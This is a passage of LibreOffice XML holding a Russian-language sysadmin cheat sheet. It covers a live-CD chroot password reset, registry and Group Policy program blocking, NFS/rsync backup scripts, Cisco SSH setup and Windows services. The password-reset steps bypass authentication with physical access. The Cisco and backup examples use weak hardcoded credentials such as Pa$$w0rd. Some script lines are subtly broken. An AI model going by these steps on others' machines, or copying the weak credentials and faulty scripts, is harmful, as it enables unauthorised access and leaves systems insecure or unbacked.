text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">login</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">rc</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">common</text:span><text:span text:style-name="T3"> ~/.</text:span><text:span text:style-name="T2">pro</text:span><text:span text:style-name="T3">ﬁ</text:span><text:span text:style-name="T2">le</text:span><text:span text:style-name="T3"> ~/.</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">/&lt;</text:span><text:span text:style-name="T2">username</text:span><text:span text:style-name="T3">&gt;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сброс</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пароля</text:span><text:span text:style-name="T2"> Reset Password Unix, FreeBSD, Linux, Debian, ASP linux</text:span></text:p>
      <text:p text:style-name="P1">Основой способ для любых unix:</text:p>
      <text:p text:style-name="P1">!!! получится если системный раздел не зашифрован</text:p>
      <text:p text:style-name="P1">0. Загружаемся с livecd </text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Например</text:span><text:span text:style-name="T2">: debian live cd, ubuntu live, <text:s/>systemrescue </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">т</text:span><text:span text:style-name="T2">.</text:span><text:span text:style-name="T3">д</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">https://www.system-rescue.org/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">1. После загрузки определяемся с дисками</text:p>
      <text:p text:style-name="P1">fdisk -l </text:p>
      <text:p text:style-name="P1">lsblk</text:p>
      <text:p text:style-name="P1">2. Монтируем раздел системы</text:p>
      <text:p text:style-name="P1">mount /dev/sda1 /mnt</text:p>
      <text:p text:style-name="P1">3. Выполняем смену корня</text:p>
      <text:p text:style-name="P1">chroot /mnt</text:p>
      <text:p text:style-name="P1">4. Выполняем смену пароля</text:p>
      <text:p text:style-name="P1">passwd user</text:p>
      <text:p text:style-name="P1">5. Выходим chroot и загружаемся в систему</text:p>
      <text:p text:style-name="P1">Ctrl+d</text:p>
      <text:p text:style-name="P1">reboot</text:p>
      <text:p text:style-name="P1">Больше способов https://bookflow.ru/sbros-parolya-reset-password-unix-freebsd-linux-debian-asp-linux/</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запрет</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запуска</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">приложения</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">через</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">реестр</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">“DisallowRun”=dword:00000001</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">“1″=”программа.exe”</text:p>
      <text:p text:style-name="P7">“2″=”другая_программа.exe”</text:p>
      <text:p text:style-name="P1">GPO Запрет запуска приложения через gpedit</text:p>
      <text:p text:style-name="P1">Пользовательские настройки -&gt; Административные шаблоны -&gt; Система</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">Чтобы ограничить определенные программы, выберите команду "Запускать только указанные программы Windows". Чтобы заблокировать </text:span><text:soft-page-break/><text:span text:style-name="T3">определенные программы, выберите команду "Не запускать указанные программы Windows". Удалить все текущие настройки локальных групповых политик необходимо удалить файлы Registry.pol в каталоге GroupPolicy.</text:span></text:p>
      <text:p text:style-name="P5">Сделать это можно следующими командами, запущенными в командной строке с правами администратора:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">RD /S /Q "%WinDir%\System32\GroupPolicyUsers" </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">RD /S /Q "%WinDir%\System32\GroupPolicy" </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">gpupdate /force</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">найти</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">дублирующийся</text:span><text:span text:style-name="T2"> SID </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">домене</text:span><text:span text:style-name="T2"> Active Directory</text:span></text:p>
      <text:p text:style-name="P1">0. Ntdsutil - запускаем программу на DC</text:p>
      <text:p text:style-name="P1">1. В ней выполняем: </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">security account management - </text:span><text:span text:style-name="T3">нажимаем</text:span><text:span text:style-name="T2"> Enter</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">connect to server </text:span><text:span text:style-name="T3">ИМЯ</text:span><text:span text:style-name="T2">_</text:span><text:span text:style-name="T3">СЕРВЕРА</text:span><text:span text:style-name="T2">_</text:span><text:span text:style-name="T3">КОНТРОЛЛЕРА</text:span><text:span text:style-name="T2">_</text:span><text:span text:style-name="T3">ДОМЕНА</text:span><text:span text:style-name="T2"> - </text:span><text:span text:style-name="T3">вновь</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">нажимаем</text:span><text:span text:style-name="T2"> Enter.</text:span></text:p>
      <text:p text:style-name="P1">check duplicate sid - в очередной раз нажимаем Enter. </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">2. После этого в текстовом окне программы выведутся дублирующийся SID'ы, а так же все будет записано в логфайл dupsid.log, который по умолчанию запишется в директорию </text:span><text:span text:style-name="T2">C:\Windows\system32.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">NFS \ Rsync \ Backup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">NFS </text:span><text:span text:style-name="T3">сервер</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервер</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ставим</text:span><text:span text:style-name="T2"> apt-get install nfs-kernel-server nfs-common portmap</text:span></text:p>
      <text:p text:style-name="P1">/usr/allbackup тут все будут бэкапы</text:p>
      <text:p text:style-name="P1">nano /etc/exports тут ставим какие нужны каталоги</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">/usr/allbackup/name_catalog ip_clienta(rw,sync,no_root_squash,no_subtree_check)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">применить команду exportfs -a</text:p>
      <text:p text:style-name="P1">NFS на клиенте:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">apt-get install nfs-common portmap rsync</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkdir /nfs/name_catalog -p</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nano /etc/fstab</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">ip_server:/usr/allbackup/name_catalog /nfs/name_catalog nfs rw,sync,hard,intr 0 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Создаем каталоги для бэкапа:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mkdir -p /root/backup/{www,etc,sql}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Скрипт для бэкапа:</text:p>
      <text:p text:style-name="P1">touch /root/backupwww</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#[Changes Directory]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cd /root/backup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#[Stamps the file name with a date]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">TIMESTAMP=date +%m-%d-%y-%H%M</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#[DB Backup Scripts]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># DB Name</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">HOST=localhost</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">DBNAME="basename"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">USER="username"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PASSWORD="password"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">DUMP_PATH=/root/backup/sql</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">BACK_PATH=/root/backup/www</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">BACK_PATH3=/root/backup/etc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#dbname</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mysqldump --opt -c -e -Q -h$HOST -u$USER -p$PASSWORD $DBNAME &gt; $DBNAME.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar czpf $DUMP_PATH/$DBNAME.$TIMESTAMP.tar.gz $DBNAME.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rm -f $DBNAME.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#Backing up files</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">tar cvzpf $BACK_PATH/www.$TIMESTAMP.tar.gz --same-owner <text:s/>--exclude=/var/www/site/gruzims/* /var/www</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">tar cvzpf $BACK_PATH3/etc.$TIMESTAMP.tar.gz /etc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">C</text:span><text:span text:style-name="T3">крипт</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">стиралки</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">touch /root/delbackup</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cd /var/backup/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find /var/backup/mysql -name "*.tar.gz" -mtime +30 |xargs /bin/rm -f {};</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">find /var/backup/www -name "*.tar.gz" -mtime +30 |xargs /bin/rm -f {};</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Настройка</text:span><text:span text:style-name="T2"> crontab:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">crontab -e </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">0 5 * * * /usr/bin/rsync -a /root/ /nfs/folder </text:span><text:span text:style-name="T3">синхронизируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">бэкапы</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервер</text:span><text:span text:style-name="T2"> nfs</text:span></text:p>
      <text:p text:style-name="P7">0 2 * * * /root/backupwww скрипт бэкапа</text:p>
      <text:p text:style-name="P1">Как настроить SSH на Cisco</text:p>
      <text:p text:style-name="P1">Заходим в привилегированный режим;</text:p>
      <text:p text:style-name="P1">cisco&gt;enable</text:p>
      <text:p text:style-name="P1">Устанавливаем дату и время (нужны для генерации ключа);</text:p>
      <text:p text:style-name="P5">cisco#clock set 09:02:13 27 Apr 2022</text:p>
      <text:p text:style-name="P5">Входим в режим конфигурирования;</text:p>
      <text:p text:style-name="P1">cisco#conf t</text:p>
      <text:p text:style-name="P1">Указываем домен и имя устройства (для генерации ключа);</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config)#ip domain name domain.local</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config)#hostname cisco-ssh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Генерируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ключ</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> SSH;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#crypto key generate rsa</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Храним пароли в зашифрованном виде;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#service password-encryption</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Создаем пользователя admin с паролем Pa$$w0rd и максимальными привилегиями;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#username admin privilege 15 secret Pa$$w0rd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Задаем пароль для привилегированного режима;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#enable secret Pa$$w0rd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Активируем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">протокол</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ААА</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#aaa new-model</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Разрешаем компьютерам внутренней сети заходить на Cisco по SSH;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#access-list 23 permit 192.168.0.0 0.0.0.255</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Входим в режим конфигурирования терминальный линий;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config)#line vty 0 4</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запрещаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">все</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">кроме</text:span><text:span text:style-name="T2"> SSH;</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#transport input ssh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Активируем автоматическое поднятие строки после ответа системы на проделанные изменения;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#logging synchronous</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Позволяем входить сразу в привилигированный режим;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#privilege level 15</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Настраиваем автоматическое закрытие SSH сессии через 60 минут;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#exec-timeout 60 0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Привязываем группу доступа, созданную на шаге 10, к терминальной линии;</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco-ssh(config-line)#access-class 23 in</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Выходим из настроек и сохраняем конфигурацию.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config-line)exit</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco(config)exit</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">cisco#copy run start</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Службы</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">Сервисы</text:span></text:p>
      <text:p text:style-name="P1">Управление службами:</text:p>
      <text:p text:style-name="P1">sc getkeyname "ХХХХХ" - получишь ид сервиса</text:p>
      <text:p text:style-name="P1">sc queryex "ХХХХХ" - узнаешь по ид все о сервисе</text:p>
      <text:p text:style-name="P1">0) Основным инструментом для управления службами в графическом режиме является консоль services.msc </text:p>
      <text:p text:style-name="P1">- <text:s/>«Пуск» -&gt; «Панель управления» -&gt; «Администрирование»</text:p>
      <text:p text:style-name="P1">1) Управление службами из командной строки с помощью утилиты net.exe</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net start service_name</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T2">net stop service_name</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T1"><text:span text:style-name="T3">2) </text:span><text:span text:style-name="T2">sc</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span></text:p>
      <text:p text:style-name="P1">sc.exe stop DNSCache - остановить службу DNSCache на локальном компьютере</text:p>
      <text:p text:style-name="P1">sc \\SERVER_NAME query DNSCache - опросить состояние службы DNSCache на компьютере SERVER_NAME</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sc \\SERVER_NAME start DNSCache - </text:span><text:span text:style-name="T3">запустить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службу</text:span><text:span text:style-name="T2"> DNSCache </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">компьютере</text:span><text:span text:style-name="T2"> SERVER_NAME</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">sc config "service name" start= "</text:span><text:span text:style-name="T3">параметры</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запуска</text:span><text:span text:style-name="T2">"</text:span></text:p>
      <text:p text:style-name="P1"># параметры запуска:</text:p>
      <text:p text:style-name="P1"># auto (автоматически)</text:p>
      <text:p text:style-name="P1"># demand (вручную)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># disabled (</text:span><text:span text:style-name="T3">отключена</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sc [Servername] create Servicename [Optionname= Optionvalue... - </text:span><text:span text:style-name="T3">создание</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службы</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">sc delete "name_service" - </text:span><text:span text:style-name="T3">удаление</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службы</text:span><text:span text:style-name="T2"> (!!!)</text:span></text:p>
      <text:p text:style-name="P1">Основные службы windows:</text:p>
      <text:p text:style-name="P1">w32time - служба времени</text:p>
      <text:p text:style-name="P1">csrss.exe - Client Server Runtime Process - важный компонент, он обрабатывает пользовательский режим блока подсистемы Win32. (обычная мишень для вирусов)</text:p>
      <text:p text:style-name="P1">explorer.exe - Проводник, Рабочий стол и меню Пуск. Если в этой программе происходят сбои, то Windows обычно автоматически снова запускает ее.</text:p>
      <text:p text:style-name="P1">lsass.exe - подсистема несет ответственность за аутентификацию пользователей в вашей системе</text:p>
      <text:p text:style-name="P1">rundll32.exe - программа, запуск функции в Динамически подключаемой библиотек, является загрузчиком для других программ</text:p>
      <text:p text:style-name="P1">services.exe - запускает службы, которые являются автономными процессами</text:p>
      <text:p text:style-name="P1">smss.exe - важный компонент Windows (еще он запускает из ветки реестра HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session)</text:p>
      <text:p text:style-name="P1">spoolsv.exe - (известная как spooler) программа занимается процессами печати и организации очередей печати </text:p>
      <text:p text:style-name="P1">svchost.exe - приложение несет ответственность за запуск большинства служб</text:p>
      <text:p text:style-name="P1">System - системный процесс (ntoskrnl.ехе), основной компонент Windows</text:p>
      <text:p text:style-name="P1">System Idle Process - «незанятый» процесс - 16-килобайтный цикл, используемый, чтобы занять не используемые все циклы центрального процессора</text:p>
      <text:p text:style-name="P1">winlogon.exe - управляет действиями пользователя, связанными с безопасностью (запрос входа/выхода из системы, раз/блокировка компьютера, изменение пароля, реестр)</text:p>
      <text:p text:style-name="P1">wmlprvse.exe - поддержка инструментальных средств управления средой Windows (WMI), также известен как Управление предприятием на основе веб-технологий (WBEM)</text:p>
      <text:p text:style-name="P1">Один экземпляр svchost.exe отвечает за одну или несколько служб. Никогда не вмешивайтесь в копии svchost.exe или services.exe, которые вы увидите в списке Диспетчера задач. Службы которые можно отключить для повышение производительности домашнего ПК c windows 10:</text:p>
      <text:p text:style-name="P5">Dmwappushservice - служба маршрутизации пуш-сообщений WAP, один из так называемых элементов слежки Microsoft.</text:p>
      <text:p text:style-name="P8"><text:soft-page-break/><text:span text:style-name="T3">NVIDIA Stereoscopic 3D Driver Service - если на своем ПК или ноутбуке с графическим адаптером от NVIDIA вы не смотрите стереоскопическое 3D-видео, данную службу можно смело отключить.</text:span></text:p>
      <text:p text:style-name="P1">Superfetch - может быть отключена, если в качестве системного диска используется SSD.</text:p>
      <text:p text:style-name="P1">Биометрическая служба Windows - отвечает за сбор, сравнение, обработку и хранение биометрических данных о пользователе и приложениях. Работает только на устройствах со сканерами отпечатка пальца и прочими биометрическими датчиками, поэтому на остальных может быть отключена.</text:p>
      <text:p text:style-name="P1">Браузер компьютеров - можно отключить, если ваш ПК или ноутбук является единственным устройством в сети, то есть не подключен к домашней сети и/или другим компьютерам.</text:p>
      <text:p text:style-name="P1">Вторичный вход в систему - если вы являетесь единственным пользователем в системе и в ней нет других учетных записей, эта служба может быть отключена.</text:p>
      <text:p text:style-name="P1">Диспетчер печати - отключать стоит исключительно в том случае, если вы не пользуетесь не только физическим принтером, но и виртуальным, то есть не экспортируете электронные документы в формат PDF.</text:p>
      <text:p text:style-name="P1">Общий доступ к подключению к Интернету (ICS) - если вы не раздаете со своего ПК или ноутбука Wi-Fi, и к нему не требуется подключаться с других устройств для обмена данными, службу можно отключить.</text:p>
      <text:p text:style-name="P1">Рабочие папки - предоставляет возможность настройки доступа к данным внутри корпоративной сети. Если вы в таковую не входите, можно отключать.</text:p>
      <text:p text:style-name="P1">Сетевая служба Xbox Live - если не играете на Xbox и в Windows-версии игр для этой консоли, службу можно отключить.</text:p>
      <text:p text:style-name="P1">Служба виртуализации удаленных рабочих столов Hyper-V - это виртуальная машина, интегрированная в корпоративные версии Windows. Если вы таковой не пользуетесь, можете смело деактивировать как конкретно эту службу, так и указанные ниже, напротив которых мы установили пометку «Hyper-V» или это обозначение есть в их названии.</text:p>
      <text:p text:style-name="P1">Служба географического положения - название говорит само за себя, с помощью этой службы система отслеживает ваше местоположение. Если считаете ее ненужной, можете отключать, но помните, что после этого даже стандартное приложение «Погода» будет работать некорректно.</text:p>
      <text:p text:style-name="P1">Служба данных датчиков - отвечает за обработку и хранение сведений, получаемых системой с установленных в компьютере датчиков. По сути, это банальная статистика, не представляющая интереса для рядового пользователя.</text:p>
      <text:p text:style-name="P1">Служба датчиков - аналогично предыдущему пункту, может быть отключена.</text:p>
      <text:p text:style-name="P1">Служба завершения работы в качестве гостя - Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба лицензий клиента (ClipSVC) - после отключения этой службы могут неправильно работать приложения интегрированного в Windows 10 Microsoft Store, поэтому будьте осторожны.</text:p>
      <text:p text:style-name="P1">Служба маршрутизатора AllJoyn - протокол передачи данных, который рядовому пользователю скорее всего не потребуется.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Служба наблюдения за датчиками - аналогично службе датчиков и их данных, может быть деактивирована без вреда для ОС.</text:span></text:p>
      <text:p text:style-name="P13">Служба обмена данными - Hyper-V.</text:p>
      <text:p text:style-name="P13">Служба общего доступа к портам Net.TCP - предоставляет возможность совместного использования TCP-портов. Если таковая вам не нужна, можете деактивировать функцию.</text:p>
      <text:p text:style-name="P1">Служба поддержки Bluetooth - можно отключить лишь в том случае, если вы не используете Bluetooth-совместимые устройства и не планируете этого делать.</text:p>
      <text:p text:style-name="P1">Служба пульса - Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба сеансов виртуальных машин Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба синхронизации времени Hyper-V.</text:p>
      <text:p text:style-name="P1">Служба шифрования дисков BitLocker - если вы не используете данную функцию Windows, можете отключать.</text:p>
      <text:p text:style-name="P1">Удаленный реестр - открывает возможность удаленного доступа к реестру и может быть полезна для системного администратора, но рядовому пользователю не нужна. Удостоверение приложения - идентифицирует ранее заблокированные приложения. Если не пользуетесь функцией AppLocker, можете смело отключать данную службу.</text:p>
      <text:p text:style-name="P1">Архивация и сжатие файлов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">gzip</text:span><text:span text:style-name="T3"> -9 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 - Поместить файл </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 в архив </text:span><text:span text:style-name="T2">gzip</text:span><text:span text:style-name="T3"> с максимальной степенью сжатия</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"># </text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1 </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1 - Создать </text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3"> архив </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1.</text:span><text:span text:style-name="T2">rar</text:span><text:span text:style-name="T3">, заархивировав файлы: </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">1, </text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">2 и директорию: </text:span><text:span 